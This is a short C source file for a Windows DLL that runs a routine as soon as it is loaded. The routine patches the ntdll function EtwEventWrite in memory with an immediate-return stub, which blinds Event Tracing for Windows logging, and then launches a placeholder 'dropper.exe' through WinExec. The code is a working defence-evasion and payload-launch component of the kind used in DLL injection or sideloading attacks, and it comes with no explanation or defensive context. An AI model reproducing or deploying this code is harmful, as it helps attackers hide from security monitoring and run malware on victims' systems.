#include <windows.h>

typedef void* (*tNtVirtual) (HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T  NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);
tNtVirtual oNtVirtual;

void spwnrce()
{
    unsigned char patch[] = { 0x48, 0x33, 0xc0, 0xc3 };     // xor rax, rax; ret

    ULONG oldprotect = 0;
    size_t size = sizeof(patch);

    HANDLE hCurrentProc = GetCurrentProcess();

    unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };

    unsigned char sNtdll[] = { 'n','t','d','l','l','.','d','l','l',0x0};

    void* pEventWrite = GetProcAddress(GetModuleHandle((LPCSTR)sNtdll), (LPCSTR)sEtwEventWrite);
    FARPROC farProc = GetProcAddress(GetModuleHandle((LPCSTR)sNtdll), "NtProtectVirtualMemory");
    oNtVirtual = (tNtVirtual)farProc;
    oNtVirtual(hCurrentProc, &pEventWrite, (PSIZE_T)&size, PAGE_READWRITE, &oldprotect);

    memcpy(pEventWrite, patch, size / sizeof(patch[0]));

    oNtVirtual(hCurrentProc, &pEventWrite, (PSIZE_T)&size, oldprotect, &oldprotect);
    FlushInstructionCache(hCurrentProc, pEventWrite, size);

    WinExec("C:\\PATH\\TO\\DROPPER\\dropper.exe",1);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        spwnrce();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
